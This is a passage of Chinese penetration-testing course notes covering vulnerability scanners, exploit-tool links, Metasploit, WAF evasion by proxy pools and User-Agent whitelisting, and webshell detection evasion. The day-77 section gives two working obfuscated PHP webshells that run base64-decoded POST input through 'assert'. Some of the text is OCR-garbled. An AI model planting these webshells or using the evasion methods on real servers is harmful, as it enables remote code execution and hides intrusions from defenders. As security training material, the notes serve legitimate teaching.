<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、网站源码采用自己开发搭建</span><br><span class="line">2、网站源码采用开源CMS搭建</span><br><span class="line"></span><br><span class="line">常规漏洞 -自己开发搭建</span><br><span class="line">常规漏洞 - 开源CMS 团队可以做这个事情 一般用工具直接找到漏洞不太现实(其他非源码漏除外)</span><br><span class="line"></span><br><span class="line">冷门 小众 国内的CMS源码 用 AWVS不适合</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Burp Suite,是用于攻击web应用程序的集成平台，包含了许多工具。Burp Suite为这些工具</span><br><span class="line">设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应</span><br><span class="line">的HTTP消息、持久性、认证、代理、日志、警报。</span><br><span class="line"></span><br><span class="line">用到最多的工具感觉是，Web手必备</span><br></pre></td></tr></table></figure>

<blockquote>
<p>pocassist是一个Golang编写的全新开源漏洞测i试框架。实现对poc的在线编辑、管理、测<br>试。如果你不想撸代码，又想实现即0c的逻辑，又想在线对靶机快速测试，那就使用<br>pocassist吧。完全兼容xray,但又不仅仅是xTay。除了支持定义目录级漏洞poc,还支持服<br>务器级漏洞、参数级漏洞、U级漏洞以及对页面内容检测，如果以上还不满足你的需求，<br>还支持加载自定义脚本。</p>
</blockquote>
<blockquote>
<p>afrog是一款性能卓越。快速稳定、PoC可定制的漏洞扫猫（挖洞）工具，PoC涉及<br>CVE、CNVD、默认口令、信息泄露、指纹识别、未授权访问、任意文件读取、命令执行<br>等多种漏洞类型，帮助网络安全从业者快速验证并及时修复漏洞。</p>
</blockquote>
<blockquote>
<p>Xray是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神醒，支持主动、披动多种扫描方<br>式，自备言打平台、可以灵活定义POC,功能丰富，调用简单，支持Windows &#x2F;macOs<br>几inuX多种操作系统，可以满足广大安全从业者的自动化Wb漏洞深测需求。</p>
</blockquote>
<blockquote>
<p>Goby是一款新的网络安全测试工具，由赵武Zwell(Pangolin、JSky、FOFA作者)打造，<br>它能够针对一个目标企业梳理最全的攻击面信息，同时能进行高效、实战化漏洞扫描，并<br>快速的从一个验证入口点，切换到横向。能通过智能自动化方式，帮助安全入门者就悉靶<br>场攻防，帮助攻防服务者、渗透人员更快的拿下目标</p>
</blockquote>
<blockquote>
<p>Vulmap是一款web漏洞扫描和验证工具，可对webapps进行漏洞扫描，并且具备漏洞利用<br>功能，目前支s持的webapps包括activemq,flink,shiro,sol,struts2,tomcat,unomi,drupal,<br>elasticsearch,fastison,jenkins,nexus,weblogic,jboss,spring,thinkphp</p>
</blockquote>
<p>真就差不多是，工具使用大战！</p>
<h3 id="演示案例：-42"><a href="#演示案例：-42" class="headerlink" title="演示案例："></a>演示案例：</h3><p>某APP-Web扫描-常规&amp;联动-Burp&amp;Awvs&amp;Xray<br>Vulfocus-框架扫描-特定-Goby&amp;Vulmap&amp;Afrog&amp;Pocassist<br>某资产特征-联动扫描-综合&amp;调用-Goby&amp;Awvs&amp;Xray&amp;Vulmap</p>
<h4 id="项目资源："><a href="#项目资源：" class="headerlink" title="项目资源："></a>项目资源：</h4><p><a target="_blank" rel="noopener" href="https://www.ddosi.org/awvs14-6-log4j-rce/">https://www.ddosi.org/awvs14-6-log4j-rce/</a><br><a target="_blank" rel="noopener" href="https://github.com/chaitin/xray/releases">https://github.com/chaitin/xray/releases</a><br><a target="_blank" rel="noopener" href="https://github.com/zan8in/afrog/releases">https://github.com/zan8in/afrog/releases</a><br><a target="_blank" rel="noopener" href="https://github.com/zhzyker/vulmap/releases">https://github.com/zhzyker/vulmap/releases</a><br><a target="_blank" rel="noopener" href="https://github.com/jweny/pocassist/releases">https://github.com/jweny/pocassist/releases</a><br><a target="_blank" rel="noopener" href="https://github.com/gobysec/Goby/releases">https://github.com/gobysec/Goby/releases</a></p>
<h4 id="其他特扫："><a href="#其他特扫：" class="headerlink" title="其他特扫："></a>其他特扫：</h4><p>1、GUI TOOLS V6.1by安全圈小王子-bugfixed<br>2、CMS漏洞扫描器名称支持的CMS平台<br>Droopescan<br>WordPress,Joomla,Drupal,Moodle,SilverStripe<br>CMSmap WordPress,Joomla,Drupal,Moodle<br>CMSeeK WordPress,Joomla,Drupal<br>WPXF WordPress<br>WPScan WordPress<br>WPSeku WordPress<br>WPForce WordPress<br>JoomScan Joomla<br>JoomlaVS Joomla<br>JScanner Joomla<br>Drupwn Drupal<br>Typo3Scan Typo3<br>致远OA综合利用工具<br><a target="_blank" rel="noopener" href="https://github.com/Summer177/seeyon_exp">https://github.com/Summer177/seeyon_exp</a><br>seeyon exp<br>通达OA综合利用工具<br><a target="_blank" rel="noopener" href="https://github.com/xinyu2428/TDOA">https://github.com/xinyu2428/TDOA</a> RCE TDOA RCE<br>蓝凌OA漏洞利用工具前台无条件RCE文件写入<br><a target="_blank" rel="noopener" href="https://github.com/yuanhaiGreg/LandrayExploit">https://github.com/yuanhaiGreg/LandrayExploit</a> LandrayExploit<br>泛微OA漏洞综合利用脚本htps:&#x2F;&#x2F;github.com&#x2F;z1 un&#x2F;weaver_exp weaver_.eXp<br>锐捷网络EG易风关RCE批量安全检测<br><a target="_blank" rel="noopener" href="https://github.com/Tas9er/EgGateWayGetShell">https://github.com/Tas9er/EgGateWayGetShell</a><br>EgGateWayGetShell<br>CMSmap针对流行cMS进行安全扫描的工具htps:&#x2F;&#x2F;github.com&#x2F;Dionach&#x2F;CMSmap<br>CMSmap<br>使用Go开发的WordPress漏洞扫描工具<br><a target="_blank" rel="noopener" href="https://github.com/blackbinn/wprecon">https://github.com/blackbinn/wprecon</a><br>wprecon<br>一个Ruby框架，旨在帮助对VordPress系统进行渗透测试<br><a target="_blank" rel="noopener" href="https://github.com/rastating/wordpress-exploit-framework">https://github.com/rastating/wordpress-exploit-framework</a> wordpress-exploit-framework<br>WPScan WordPress安全扫描器<br><a target="_blank" rel="noopener" href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a> wpscan<br>VPForce Wordpress攻击套件<a target="_blank" rel="noopener" href="https://github.com/nO0">https://github.com/nO0</a> py&#x2F;WPForce<br>WPForce</p>
<p>某APP-Web扫描-常规&amp;联动-Burp&amp;Awvs&amp;Xray<br>案例：配合联动对某APP进行安全检查评估<br>对比工具优缺点<br>-对比工具使用方法</p>
<p>Awvs:</p>
<p>任务添加&amp;数据头部&amp;代理模式&amp;扫描模式等<br>example:<a target="_blank" rel="noopener" href="http://demo.aisec.cn/">http://demo.aisec.cn/</a></p>
<p>Xray:</p>
<p>主动扫描&amp;被动扫描&amp;POC资源等<br>.\xray_windows_amd64.exe webscan –basic-craller <a target="_blank" rel="noopener" href="http://xx/%E2%80%93html-output">http://xx/–html-output</a> tomcat.html<br>.\xray_windows_amd64.exe webscan–listen 127.0.0.1:7777–html-output app.html<br>主动扫描的缺点:</p>
<p>URL单点扫描&amp;数据包扫描<br>1、相互联动性解决漏扫<br>2、相互联动性解决URL未探针<br>手工触发URL数据包&amp;扫描器爬虫规则探针<br>Burp&amp;Xray联动<br>1、Burp设置转发代理<br>2、Xray设置被动扫描<br>AwWs&amp;Xray联动<br>1、AWWS设置代理扫猫<br>2、Xray设置被动扫描<br>Awvs&amp;Burp&amp;Xray联动<br>1、AwWS设置代理扫描<br>2、Bup设置转发代理<br>3、Xray设置被动扫描</p>
<p>Vulfocus-框架扫描-特定&amp;核心-Goby&amp;Vulmap&amp;Afrog&amp;Pocassist<br>案例：配合vulfocus进行某服务或中间件的安全检查评估</p>
<p>某资产特征-联动扫描-综合&amp;调用-Goby&amp;AWVS&amp;Xray&amp;Vulmap<br>案例：配合Goby&amp;Fofa插件进行某中间件的安全检查评估<br>1、下载拓展插件<br>2、设置配置插件</p>
<p>这几节课主要讲工具的使用简单看一下 主要是实践</p>
<h1 id="第73天-漏洞发现-操作系统服务中间件-Nuclei-Nessus-Nexpose-Goby"><a href="#第73天-漏洞发现-操作系统服务中间件-Nuclei-Nessus-Nexpose-Goby" class="headerlink" title="第73天 漏洞发现-操作系统服务中间件&amp;Nuclei&amp;Nessus.&amp;Nexpose&amp;Goby"></a>第73天 漏洞发现-操作系统服务中间件&amp;Nuclei&amp;Nessus.&amp;Nexpose&amp;Goby</h1><h4 id="知识点：-49"><a href="#知识点：-49" class="headerlink" title="知识点："></a>知识点：</h4><p>1、Goby简单介绍&amp;使用说明<br>2.Nuclei简单介绍&amp;使用说明<br>3、Nessus简单介绍&amp;使用说明<br>4、Nexpose简单介绍&amp;使用说明<br>5、掌握工具安装使用&amp;原理&amp;联动&amp;适用<br>市面上有很多漏扫系统工具脚本，课程讲到的基本都是目前主流推荐的优秀项目！<br>具体项目：Burpsuite,AwWs,Xray,Goby,Afrog,Vulmap,Pocassist,Nessus,<br>Nuclei,Pentestkit,Nexpose,BP(HaE,ShiroScan.FastJsonScan,Log4j2Scan).</p>
<h4 id="章节点：-4"><a href="#章节点：-4" class="headerlink" title="章节点："></a>章节点：</h4><p>1、漏洞发现-Web&amp;框架层面<br>2、漏洞发现-服务&amp;中间件层面<br>2、漏洞发现-APP&amp;小程序层面<br>3、漏洞发现-PC操作系统层面</p>
<h4 id="演示案例：-43"><a href="#演示案例：-43" class="headerlink" title="演示案例："></a>演示案例：</h4><p>Nessus&amp;Nexposei漏扫操作系统漏洞<br>Goby&amp;Nuclei漏扫系统&amp;服务&amp;中间件漏洞<br>Nuclei漏扫特定资产&amp;模版导入&amp;最新漏洞<br>FofaMAP&amp;Nuclei漏扫自动化特定项目漏洞</p>
<h4 id="项目资源：-1"><a href="#项目资源：-1" class="headerlink" title="项目资源："></a>项目资源：</h4><p>Goby:<a target="_blank" rel="noopener" href="https://github.com/gobysec/Goby/releases">https://github.com/gobysec/Goby/releases</a><br>Nuclei:<a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a><br>Nessus:<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/G-7Yu8sefH3Bm3GRtUo2EA">https://mp.weixin.qq.com/s/G-7Yu8sefH3Bm3GRtUo2EA</a><br>Nexpose:<a target="_blank" rel="noopener" href="https://www.fujieace.com/hacker/rapid7-nexpose.html">https://www.fujieace.com/hacker/rapid7-nexpose.html</a><br>FofaMAP:<a target="_blank" rel="noopener" href="https://github.com/asaotomo/FofaMap">https://github.com/asaotomo/FofaMap</a></p>
<h4 id="案例1-Nessus-Nexpose漏扫操作系统漏洞"><a href="#案例1-Nessus-Nexpose漏扫操作系统漏洞" class="headerlink" title="案例1-Nessus&amp;Nexpose漏扫操作系统漏洞"></a>案例1-Nessus&amp;Nexpose漏扫操作系统漏洞</h4><p>安装使用</p>
<h4 id="案例2-Goby-Nucle漏扫系统-服务-中间件漏洞"><a href="#案例2-Goby-Nucle漏扫系统-服务-中间件漏洞" class="headerlink" title="案例2-Goby&amp;Nucle漏扫系统&amp;服务&amp;中间件漏洞"></a>案例2-Goby&amp;Nucle漏扫系统&amp;服务&amp;中间件漏洞</h4><p>goby图形化界面<br>nuclei 可以自定义检测脚本<br>Nuclei -u <a target="_blank" rel="noopener" href="http://xxxxxxxx/">http://xxxxxxxx</a></p>
<h4 id="案例3-Nuclei漏扫特定资产-模版导入-最新漏洞"><a href="#案例3-Nuclei漏扫特定资产-模版导入-最新漏洞" class="headerlink" title="案例3-Nuclei漏扫特定资产&amp;模版导入&amp;最新漏洞"></a>案例3-Nuclei漏扫特定资产&amp;模版导入&amp;最新漏洞</h4><p>例子：CVE-2022-30525:ZyXl防火墙远程命令注入漏洞<br>FofaViewer:title&#x3D;&#x3D;“USG FLEX 50(USG20-VPN)”<br>nuclei.exe -t Zyxel.yaml -I z.txt<br>Zyxel.yaml<br>id:CVE-2022-30525</p>
<h4 id="案例4-FofaMAP户-Nucle漏扫自动化特定资产漏洞"><a href="#案例4-FofaMAP户-Nucle漏扫自动化特定资产漏洞" class="headerlink" title="案例4-FofaMAP户&amp;Nucle漏扫自动化特定资产漏洞"></a>案例4-FofaMAP户&amp;Nucle漏扫自动化特定资产漏洞</h4><h1 id="第74天-漏洞发现-Web框架中间件插件-BurpSuite-浏览器-被动-主动探针"><a href="#第74天-漏洞发现-Web框架中间件插件-BurpSuite-浏览器-被动-主动探针" class="headerlink" title="第74天 漏洞发现-Web框架中间件插件&amp;BurpSuite&amp;浏览器&amp;被动&amp;主动探针"></a>第74天 漏洞发现-Web框架中间件插件&amp;BurpSuite&amp;浏览器&amp;被动&amp;主动探针</h1><p>最近几天都是演示工具如何使用如：<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=AWVS&spm=1001.2101.3001.7020">AWVS</a>、Nessus、nexpose等综合性利用工具。<br>Burp插件和漏扫工具的区别</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">目标：</span><br><span class="line">1、用其他的工具项目去检测漏洞</span><br><span class="line"></span><br><span class="line">2、用Burpsuite抓包后带入插件检测</span><br><span class="line">有部分目标需要特定的数据包访问的</span><br><span class="line"></span><br><span class="line">1、登录状态和未登录状态</span><br><span class="line">2、不同目标访问的数据包的不同</span><br></pre></td></tr></table></figure>

<h4 id="知识点：-50"><a href="#知识点：-50" class="headerlink" title="知识点："></a>知识点：</h4><p>1、浏览器插件&amp;BurpSuite插件<br>2、Hack-Tools&amp;pentestkit&amp;fofa view等<br>3、Fiora&amp;Spring&amp;Fastison&amp;Shiro&amp;Log4等<br>市面上有很多漏扫系统工具蜘本，课程讲到的基本都是目前主流推荐的优秀项目！<br>具体项目：Burpsuite,Awvs,Xray,Goby,Afrog,Vulmap,Pocassist,Nessus,<br>Nuclei,Pentestkit,Nexpose,BP(HaE,ShiroScan.FastJsonScan,Log4j2Scan).</p>
<h4 id="章节点：-5"><a href="#章节点：-5" class="headerlink" title="章节点："></a>章节点：</h4><p>1、漏洞发现-Web&amp;框架层面<br>2、漏洞发现服务&amp;中间件层面<br>3、漏洞发现-APP&amp;小程序层面<br>4、漏洞发现PC操作系统层面</p>
<h4 id="演示案例：-44"><a href="#演示案例：-44" class="headerlink" title="演示案例："></a>演示案例：</h4><p>浏览器插件-辅助&amp;资产&amp;漏洞库-Hack-Tools&amp;Fofa view&amp;Pentestkit<br>BurpSuite插件-被动&amp;特定扫描-Fiora&amp;Spring&amp;Fastison&amp;Shiro&amp;Log4j</p>
<p>浏览器插件-辅助&amp;资产&amp;漏洞库-Hack.Tools&amp;Fofa view&amp;Pentestkit<br>资产：<a target="_blank" rel="noopener" href="https://github.com/fofapro/fofa_view">https://github.com/fofapro/fofa_view</a><br>信息收集 需要fofa为登录状态</p>
<p>辅助：<a target="_blank" rel="noopener" href="https://github.com/LasCc/Hack-Tools">https://github.com/LasCc/Hack-Tools</a><br>工具箱包含有 反弹shell、系统命令、文件包含语句等</p>
<p>漏洞库：<a target="_blank" rel="noopener" href="https://github.com/DenisPodgurskii/pentestkit">https://github.com/DenisPodgurskii/pentestkit</a><br>信息收集、漏洞探测、waf识别</p>
<p>BurpSuite插件-被动&amp;特定扫描-Fiora&amp;Spring&amp;Fastjson&amp;Shiro&amp;Log4</p>
<p><a target="_blank" rel="noopener" href="https://github.com/bit4woo/Fiora">https://github.com/bit4woo/Fiora</a><br>功能：联动nuclei进行单个或多个poc测试</p>
<p><a target="_blank" rel="noopener" href="https://github.com/metaStor/SpringScan">https://github.com/metaStor/SpringScan</a><br>SpringScan 漏洞检测 Burp插件<br><a target="_blank" rel="noopener" href="https://github.com/Maskhe/FastjsonScan">https://github.com/Maskhe/FastjsonScan</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/bigsizeme/Log4j-check">https://github.com/bigsizeme/Log4j-check</a><br>被动lg4j扫描 支持RC1绕过 log4J burp被扫插件、CVE-2021-44228、支持RC1绕过、支持json数据类型、支持dnslog.cn和burp内置DNS、可配合JNDIExploit生成payload</p>
<p><a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-burp-plugin">https://github.com/projectdiscovery/nuclei-burp-plugin</a></p>
<p>这节主要讲的大部分都是对相关工具的使用。</p>
<h1 id="第75天-漏洞利用-MSF框架-CVE-CNVD-POC-EXP监控-查找-整理"><a href="#第75天-漏洞利用-MSF框架-CVE-CNVD-POC-EXP监控-查找-整理" class="headerlink" title="第75天 漏洞利用-MSF框架&amp;CVE&amp;CNVD&amp;POC&amp;EXP监控&amp;查找&amp;整理"></a>第75天 漏洞利用-MSF框架&amp;CVE&amp;CNVD&amp;POC&amp;EXP监控&amp;查找&amp;整理</h1><h4 id="知识点：-51"><a href="#知识点：-51" class="headerlink" title="知识点："></a>知识点：</h4><p>1、MSF-漏洞利用框架使用<br>2、库查找CVE&amp;CNVD&amp;关键字<br>3、库整理-CVE&amp;CNVD漏洞详情<br>4、新漏洞-框架或其他未集成利用<br>集成和未集成漏洞的利用思路，漏洞利用条件等。</p>
<p>漏洞发现后，一般会有那些关于漏洞的常见说明信息：<br>1、漏洞对象<br>2、漏洞编号<br>3、漏洞类型</p>
<h4 id="漏洞资源："><a href="#漏洞资源：" class="headerlink" title="漏洞资源："></a>漏洞资源：</h4><p>today-cve<br><a target="_blank" rel="noopener" href="https://cassandra.cerias.purdue.edu/CVE_changes/today.html">https://cassandra.cerias.purdue.edu/CVE_changes/today.html</a><br>cve官网<br><a target="_blank" rel="noopener" href="https://cve.mitre.org/">https://cve.mitre.org/</a><br>国家信息安全漏洞共享平台<br><a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a><br>国家信息安全漏洞库<br><a target="_blank" rel="noopener" href="http://www.cnnvd.org.cn/">http://www.cnnvd.org.cn/</a></p>
<h4 id="演示案例：-45"><a href="#演示案例：-45" class="headerlink" title="演示案例："></a>演示案例：</h4><p>漏洞利用整理库-PocOrExp&amp;CVE-CNVD<br>漏洞利用-查找库-SearchSploit&amp;PoC-in-GitHub<br>漏洞利用-模块框架-MetaSploit-.Framework(MSF)<br>漏洞利用-杂乱工具-特定图像化渗透武器库(6.1)</p>
<p>漏同利用-整理库-PocOrExp&amp;CVE-CNVD<br><a target="_blank" rel="noopener" href="https://github.com/ttonys/Scrapy-CVE-CNVD">https://github.com/ttonys/Scrapy-CVE-CNVD</a><br><a target="_blank" rel="noopener" href="https://github.com/ycdxsb/PocOrExp">https://github.com/ycdxsb/PocOrExp</a> in Github</p>
<p>漏同利用-查找库-SearchSploit&amp;PoC-in-GitHub<br><a target="_blank" rel="noopener" href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a><br><a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></p>
<p>漏洞利用-模块框架-MetaSploit-Framework(MSF)</p>
<blockquote>
<p>利用查找：</p>
<p>基于三个信息：</p>
<p>1、漏洞信息</p>
<p>2、漏洞编号</p>
<p>3、漏洞对象</p>
<p>利用漏洞：<br>MSF漏洞利用框架</p>
<p>集成大部分的安全漏洞利用模块，直接利用MSF对漏洞进行利用</p>
<p>但是不代表所有漏洞都有集成，漏洞类型或漏洞影响等原因造成未集成</p>
<p>1、最新漏洞</p>
<p>2、漏洞复现复杂</p>
<p>3、漏洞影响过小</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.metasploit.com/">https://www.metasploit.com/</a><br>安装下载<br><a target="_blank" rel="noopener" href="https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html">https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html</a><br>简单使用：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42380348/article/details/123549631">https://blog.csdn.net/weixin_42380348/article/details/123549631</a></p>
<p>漏同利用-杂周工具特定图像化渗透武器库(V6.1)<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Ha1R17KH-vssbr8cmYwl4Q">https://mp.weixin.qq.com/s/Ha1R17KH-vssbr8cmYwl4Q</a></p>
<h1 id="第76天-WAF攻防-信息收集-识别-被动探针-代理池-仿指纹-白名单"><a href="#第76天-WAF攻防-信息收集-识别-被动探针-代理池-仿指纹-白名单" class="headerlink" title="第76天 WAF攻防-信息收集&amp;识别&amp;被动探针&amp;代理池&amp;仿指纹&amp;白名单"></a>第76天 WAF攻防-信息收集&amp;识别&amp;被动探针&amp;代理池&amp;仿指纹&amp;白名单</h1><h3 id="知识点：-52"><a href="#知识点：-52" class="headerlink" title="知识点："></a>知识点：</h3><p>1、WAF介绍&amp;模式&amp;识别&amp;防护等<br>2、信息收集被动扫描&amp;第三方接口<br>3、信息收集基于<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E7%88%AC%E8%99%AB&spm=1001.2101.3001.7020">爬虫</a>&amp;文件目录探针<br>4、信息收集基于用户&amp;代理池&amp;白名单</p>
<h4 id="章节点：-6"><a href="#章节点：-6" class="headerlink" title="章节点："></a>章节点：</h4><p>WF绕过主要集中在信息收集，漏洞发现，漏洞利用，权限控制四个阶段，</p>
<p>补充点：<br>1、什么是WAF?<br>Web Application Firewall(web应用防火墙)，一种公认的说法是web应用防火墙通过执<br>行一系列针对HTTP&#x2F;HTTPS的安全策路来专门为web应用提供保护的一款产品。<br>基本可以分为以下4种<br>软件型WAF<br>以软件的形式安装在服务器上面，可以接触到服务器上的文件，因此就可以检服务器上<br>是否有webshell,是否有文件被创建等。<br>硬件型WAF<br>以硬件形式部署在链路中，支持多种部暑方式。当串联到链路上时可以拦截恶意流量，在<br>旁路监听模式时只记录攻击但是不进行拦截，<br>云WAF<br>一般以反向代理的形式工作，通过配置后，使对网贴的请求数据优先经过WAF主机，在<br>WAF主机对数据进行过滤后再传给服务器<br>网站内置的WAF<br>就是来自网站内部的过滤，直接出现在网站代码中，比如说对输入的参数强制类转换啊，<br>对输入的参数进行教感词检汉则阿 什么的</p>
<h4 id="演示案例：-46"><a href="#演示案例：-46" class="headerlink" title="演示案例："></a>演示案例：</h4><p>信息收集被动扫描黑暗擎&amp;三方接口<br>信息收集目录扫描-Python代理加载脚本<br>信息收集-工具扫描-Awvs&amp;Xray&amp;Goby内置</p>
<p>信息收集常见检测：<br>1、脚本或工具速度流量快<br>2、脚本或工具的指纹被识别<br>3、脚本或工具的检测Payload</p>
<p>信息收集常见方法：<br>1、延迟：解决请求过快封IP的情况<br>2、代理池：在确保速度的情况下解决请求过快封P的拦截<br>3、白名单：模拟白名单模拟WAF授权测试，解决速度及测试拦截<br>4、模拟用户：模拟真实用户数据包请求探针，解决WAF指纹识别</p>
<p>延迟设置扫描间隔</p>
<p>代理池使用proxifier代理</p>
<p>案例：安全狗存在UA白名单，即设置为百度或360爬虫的UA头有概率绕过封禁</p>
<p>信息收集被动扫描黑暗弱引擎&amp;三方接口<br>黑暗引擎：Fofa Quake Shodan zoomeye0.zone等<br>其他接口：htps:&#x2F;forum.ywhack.com&#x2F;bountytips.php?getinfo</p>
<p>信息收集目录扫描Python代理加载脚本<br>import requests<br>import time</p>
<p>xray设置代理 修改配置文件 或者使用proxifier代理软件</p>
<p>goby设置代理</p>
<h1 id="第七十七天WAF攻防-权限控制-代码免杀-异或运算-变量覆盖-混淆加密-传参"><a href="#第七十七天WAF攻防-权限控制-代码免杀-异或运算-变量覆盖-混淆加密-传参" class="headerlink" title="第七十七天WAF攻防-权限控制&amp;代码免杀&amp;异或运算&amp;变量覆盖&amp;混淆加密&amp;传参"></a>第七十七天WAF攻防-权限控制&amp;代码免杀&amp;异或运算&amp;变量覆盖&amp;混淆加密&amp;传参</h1><h4 id="知识点：-53"><a href="#知识点：-53" class="headerlink" title="知识点："></a>知识点：</h4><p>1、脚本后门基础&amp;原理<br>2、脚本后门查杀绕过机制<br>3、权限维持覆盖&amp;传参&amp;加密&amp;异或等<br>代码块&amp;传参数据&amp;工具指纹等(表面&amp;行为)<br>1、代码表面层免杀-ASP&amp;PHP&amp;JSP&amp;ASPX等<br>2、工具行为层免杀菜刀&amp;蚁剑&amp;冰蝎&amp;哥斯拉等</p>
<h4 id="章节点：-7"><a href="#章节点：-7" class="headerlink" title="章节点："></a>章节点：</h4><p>WAF绕过主要集中在信息收集，漏洞发现，漏洞利用，权限控制四个阶段</p>
<h4 id="补充点："><a href="#补充点：" class="headerlink" title="补充点："></a>补充点：</h4><p>1、什么是WAF?<br>Veb Application Firewall(web应用防火墙)，一种公认的说法是”web应用防火墙通过执<br>行一系列针对HTTP&#x2F;HTTPS的安全策路来专门为wb应用提供保护的一款产品。<br>基本可以分为以下4种<br>软件型WAF<br>以软件的形式安装在服务器上面，可以接触到服务器上的文件，因此就可以检测服务器上<br>是否有webshell,是否有文件被创建等。<br>硬件型WAF<br>以硬件形式部署在链路中，支持多种部暑方式。当串联到链路上时可以拦截恶意流重，在<br>旁路监听模式时只记录攻击但是不进行拦截。<br>云WAF<br>一股以反向代理的形式工作，通过配置后，使对网站的请求数据优先经过WAF主机，在<br>WAF主机对数据进行过滤后再传给服务器<br>网站内置的WAF<br>就是来自网站内部的过滤，直接出现在网站代码中，比如说对输入的参数强制类转换啊，<br>对输入的参数进行敏感词检测测啊什么的</p>
<h4 id="演示案例：-47"><a href="#演示案例：-47" class="headerlink" title="演示案例："></a>演示案例：</h4><p>基础-脚本后门控制原理代码解释<br>原理-脚本后门查杀机制-函数&amp;行为<br>代码-脚本后门免杀变异-覆盖&amp;传参<br>代码-脚本后门免杀变异-异或&amp;加密<br>拓展脚本后门脚本类型-JSP&amp;ASPX</p>
<p>基础脚本后门控制原理代码解释<br>对比工具代码菜刀&amp;蚁剑&amp;冰蝎&amp;哥斯拉等</p>
<p>原理脚本后门查杀机制函数&amp;行为<br>对比WAF规则数匹配&amp;工具指纹等</p>
<p>代码脚本后门免杀变异夏盖&amp;传参<br>1.php传参带入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$a</span>.<span class="string">&#x27;ert&#x27;</span>;</span><br><span class="line"><span class="variable">$aa</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;X&#x27;</span>])):</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">?a=ass</span><br><span class="line">x=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>

<p>2.php变量覆盖</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>x&#x3D;cGhwaw5mbygpow&#x3D;&#x3D;</p>
<p>#代码脚本后门兔杀变异异或&amp;加密<br>3.php加密变异<br><a target="_blank" rel="noopener" href="http://www.phpjm.net/">http://www.phpjm.net</a><br><a target="_blank" rel="noopener" href="https://www.phpjms.com/">https://www.phpjms.com/</a><br><a target="_blank" rel="noopener" href="http://1.15.155.76.1234/">http://1.15.155.76.1234/</a><br>思路：将webshell加密，上传过程中则不会被检测出，然后传参时使用参数加密绕过参数检测</p>
<p>4.php异或运算 无字符webshell<br>import requests<br>import time<br>import threading.queue</p>
<p>拓展即本后门脚本类型JSP&amp;ASPX</p>
<p>5.php脚本生成器<br>Webshell-venom<br>ASP PHP JSP ASPX</p>
<h1 id="第78天-WAF攻防-荚刀-冰蝎-哥斯拉-流量通讯-特征绕过-检测反制-感知"><a href="#第78天-WAF攻防-荚刀-冰蝎-哥斯拉-流量通讯-特征绕过-检测反制-感知" class="headerlink" title="第78天 WAF攻防-荚刀&amp;冰蝎&amp;哥斯拉&amp;流量通讯&amp;特征绕过&amp;检测反制&amp;感知"></a>第78天 WAF攻防-荚刀&amp;冰蝎&amp;哥斯拉&amp;流量通讯&amp;特征绕过&amp;检测反制&amp;感知</h1><h4 id="知识点：-54"><a href="#知识点：-54" class="headerlink" title="知识点："></a>知识点：</h4><p>1、菜刀-流量&amp;通讯&amp;检测8绕过<br>2、冰竭-流量&amp;通计8检测&amp;绕过<br>3、哥斯拉-流量&amp;通讯&amp;检测&amp;绕过<br>代码块&amp;传参数据&amp;工具指纹等表面&amp;行为）<br>1、代码表面层免杀-ASP&amp;PHP&amp;JSP&amp;ASPX等<br>2、工具行为层免杀菜刀&amp;蚁剑&amp;冰蝎&amp;哥斯拉等</p>
